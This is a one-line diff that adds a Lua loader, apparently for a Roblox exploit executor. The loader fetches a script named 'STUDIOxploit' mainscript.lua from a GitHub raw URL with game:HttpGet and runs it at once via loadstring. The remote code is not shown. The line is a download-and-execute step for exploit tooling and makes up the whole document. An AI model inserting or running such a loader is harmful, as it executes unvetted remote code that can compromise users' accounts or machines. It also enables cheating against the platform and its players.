@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/windowsuser688/STUDIOxploit-Source-Code/refs/heads/main/mainscript.lua'))()
